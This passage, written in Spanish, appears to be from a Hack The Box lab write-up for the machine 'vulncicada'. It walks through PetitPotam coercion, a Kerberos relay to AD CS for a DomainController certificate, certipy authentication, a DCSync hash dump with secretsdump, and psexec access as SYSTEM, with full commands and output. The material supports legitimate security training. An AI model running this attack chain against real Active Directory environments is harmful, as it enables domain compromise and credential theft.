COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, MSEven
```

- PrinterBug, DFSCoerce, PetitPotam nos sirven.

En mi caso voy a usar PetitPotam para forzar la autenticación.

!!! info
    **PetitPotam** es una técnica de "coerción de autenticación" que **fuerza a una máquina Windows a autenticarse contra un servidor que TÚ eliges**.
    Petit Potam se aprovecha de la función `EfsRpcAddUsersToFile` que añade usuarios a archivos cifrados. Esta función es parte de `Encrypting File System` (EFS), una característica de windows que permite cifrar archivos y carpetas.

    El problema es que cualquier usuario autenticado puede llamar a `EfsRpcAddUsersToFile` y también puede especificar una ruta UNC como archivo objetivo a su vez esa ruta UNC puede apuntar a un archivo en un servidor que tu controlas.

    Entonces lo que sucede es algo asi: Usuario llama a `EfsRpcAddUsersToFile` y le dice al DC `Agrega un usuario a este archivo \\tuservidor\share\archivo.txt` -> El `DC` al momento de agregar el usuario a dicho archivo va a tratar de autenticarse contra nuestro servidor lo cual nos permite capturar esa autenticación.

Podemos ejecutar PetitPotam con `netexec` y apuntando al LISTENER que creamos anteriormente en el registro DNS que resuelve a nuestra IP.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$  netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA METHOD=PetitPotam

SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

Y devuelta al `krbrelayx` podemos ver que obtuvimos un certificado.

- Este certificado de plantilla `Domain Controller` nos permite realizar ataques DCSync.

```bash
──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ ./krbrelayx.py -t http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp --adcs --template DomainController -smb2support -v 'DC-JPQ225$'

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server

[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.48
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.129.234.48
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user DC-JPQ225$ since attack was already performed
[*] GOT CERTIFICATE! ID 88
[*] Writing PKCS#12 certificate to ./DC-JPQ225.pfx
[*] Certificate successfully written to file
```

Por lo cual ahora podemos obtener un TGT con dicho certificado.

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ certipy auth -pfx 'DC-JPQ225.pfx' -dc-ip 10.129.234.48
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

## Post-Explotación: DCSync y Acceso como SYSTEM

Con el TGT podemos tratar de dumpear los hashes mediante un DCSYNC.

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ KRB5CCNAME=dc-jpq225.ccache impacket-secretsdump -k -no-pass DC-JPQ225.cicada.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
```

- Obtenemos el hash de administrador.

Con el hash de administrador podemos solicitar un TGT.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ impacket-getTGT -hashes :85a0da53871a9d56b6cd05deda3a5e87 cicada.vl/administrator -k -dc-ip 10.129.234.48
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in administrator.ccache
```


```bash
──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ export KRB5CCNAME=administrator.ccache


┌──(wndr㉿wndr)-[~/Machines/hackthebox/vulncicada/loot]
└─$ impacket-psexec -k -no-pass Administrator@DC-JPQ225.cicada.vl

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC-JPQ225.cicada.vl.....
[*] Found writable share ADMIN$
[*] Uploading file fQaRRtly.exe
[*] Opening SVCManager on DC-JPQ225.cicada.vl.....
[*] Creating service cDDq on DC-JPQ225.cicada.vl.....
[*] Starting service cDDq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

Flags

```bash
C:\Users\Administrator\Desktop> type root.txt
48e7de432e4485d121**

C:\Users\Administrator\Desktop> type user.txt
69410e3dd519a81ce27**
```

***PWNED***

![](assets/Pasted%20image%2020260107202327.png)